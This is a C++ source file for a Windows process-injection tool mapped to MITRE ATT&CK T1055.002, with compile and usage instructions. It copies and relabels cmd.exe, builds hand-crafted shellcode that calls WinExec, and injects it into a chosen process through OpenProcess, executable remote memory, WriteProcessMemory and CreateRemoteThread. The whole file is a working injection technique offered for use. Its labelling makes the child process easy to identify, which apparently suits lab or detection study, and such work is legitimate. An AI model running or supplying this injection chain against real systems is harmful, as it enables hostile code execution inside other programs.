/*
 * Classic Shellcode Injection v2 - identifiable child in Task Manager
 *
 * Difference from classic_injection.cpp:
 *   v1 spawns plain "calc.exe" via msfvenom - looks identical to any
 *   user-launched calc. v2 pre-renames cmd.exe to a predictable path,
 *   patches its FileDescription, then injects HAND-CRAFTED shellcode
 *   that calls WinExec on the renamed copy. Task Manager shows:
 *       RevShell-ClassicInj   <-- big text (patched FileDescription)
 *       RevShell_C.exe        <-- image name (renamed file)
 *   so the child is instantly identifiable under the host.
 *
 * MITRE ATT&CK: T1055.002
 *
 * Compile:
 *   x86_64-w64-mingw32-g++ -std=c++20 -o inject_v2.exe classic_injection_v2.cpp
 *   cl /std:c++20 classic_injection_v2.cpp /Fe:inject_v2.exe
 *
 * Usage:
 *   inject_v2.exe <PID|name>
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* Where the renamed cmd.exe gets dropped. C:\Users\Public is world-writable
 * so no admin needed. Change if you want it near the host EXE. */
#define DECOY_PATH "C:\\Users\\Public\\RevShell_C.exe"

/* New FileDescription baked into the copy. Must be <=25 UTF-16 chars so
 * it fits in the "Windows Command Processor" slot in cmd.exe's version
 * resource. */
static const wchar_t* NEW_DESCRIPTION = L"RevShell-ClassicInj";

static DWORD find_pid_by_name(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/* Byte-patch the UTF-16 "Windows Command Processor" string in the copy's
 * version resource. new_desc must be shorter than 25 chars. */
static int patch_file_description(const char* path, const wchar_t* new_desc) {
    HANDLE h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;

    DWORD size = GetFileSize(h, NULL);
    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, size);
    DWORD read = 0;
    ReadFile(h, buf, size, &read, NULL);

    const wchar_t* needle = L"Windows Command Processor";
    size_t needle_bytes = wcslen(needle) * 2;
    size_t new_bytes    = wcslen(new_desc) * 2;

    int patched = 0;
    if (new_bytes <= needle_bytes) {
        for (DWORD i = 0; i + needle_bytes <= size; ++i) {
            if (memcmp(buf + i, needle, needle_bytes) == 0) {
                memcpy(buf + i, new_desc, new_bytes);
                for (size_t j = new_bytes; j < needle_bytes; ++j) buf[i + j] = 0;
                patched = 1;
            }
        }
    }
    if (patched) {
        SetFilePointer(h, 0, NULL, FILE_BEGIN);
        DWORD w; WriteFile(h, buf, size, &w, NULL);
    }
    HeapFree(GetProcessHeap(), 0, buf);
    CloseHandle(h);
    return patched;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID or process_name>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    if (pid == 0) {
        char name[256];
        snprintf(name, sizeof(name), "%s", argv[1]);
        if (!strstr(name, ".exe"))
            strncat(name, ".exe", sizeof(name) - strlen(name) - 1);
        pid = find_pid_by_name(name);
        if (!pid) { printf("[-] Process not found: %s\n", name); return 1; }
    }
    printf("[+] Target PID: %lu\n", pid);

    /* Step 1: pre-create the renamed, patched cmd.exe */
    printf("[*] Copying cmd.exe -> %s\n", DECOY_PATH);
    if (!CopyFileA("C:\\Windows\\System32\\cmd.exe", DECOY_PATH, FALSE)) {
        printf("[-] CopyFile failed (%lu)\n", GetLastError());
        return 1;
    }
    if (patch_file_description(DECOY_PATH, NEW_DESCRIPTION)) {
        printf("[+] Patched FileDescription in the copy\n");
    } else {
        printf("[!] FileDescription patch failed (child shows as 'Windows Command Processor')\n");
    }

    /* Step 2: build 45-byte hand-crafted shellcode:
     *   sub  rsp, 0x28                      ; shadow space + alignment
     *   lea  rcx, [rip + 0x16]              ; -> DECOY_PATH string
     *   mov  edx, 1                         ; SW_SHOWNORMAL
     *   mov  rax, <WinExec addr>            ; baked at runtime
     *   call rax
     *   add  rsp, 0x28
     *   ret                                  ; thread exits cleanly
     *   "C:\\...\\RevShell_C.exe\0"
     */
    FARPROC winexec = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
    if (!winexec) { printf("[-] WinExec not found\n"); return 1; }

    size_t pathLen = strlen(DECOY_PATH) + 1;
    size_t scLen   = 33 + pathLen;
    unsigned char* sc = (unsigned char*)malloc(scLen);
    unsigned char prolog[33] = {
        0x48,0x83,0xEC,0x28,
        0x48,0x8D,0x0D, 0x16,0x00,0x00,0x00,
        0xBA,0x01,0x00,0x00,0x00,
        0x48,0xB8, 0,0,0,0,0,0,0,0,
        0xFF,0xD0,
        0x48,0x83,0xC4,0x28,
        0xC3
    };
    memcpy(prolog + 18, &winexec, 8);
    memcpy(sc, prolog, 33);
    memcpy(sc + 33, DECOY_PATH, pathLen);
    printf("[+] Shellcode built: %zu bytes (hand-crafted WinExec)\n", scLen);

    /* Step 3: classic chain */
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess (%lu)\n", GetLastError()); free(sc); return 1; }

    LPVOID remote = VirtualAllocEx(hProc, NULL, scLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    SIZE_T written = 0;
    WriteProcessMemory(hProc, remote, sc, scLen, &written);
    printf("[+] Wrote %zu bytes at %p\n", written, remote);

    HANDLE hT = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    WaitForSingleObject(hT, 5000);
    printf("[+] Shellcode fired. Check Task Manager under the host:\n");
    printf("    big text = \"RevShell-ClassicInj\"\n");
    printf("    image    = \"RevShell_C.exe\"\n");

    free(sc);
    CloseHandle(hT);
    CloseHandle(hProc);
    return 0;
}
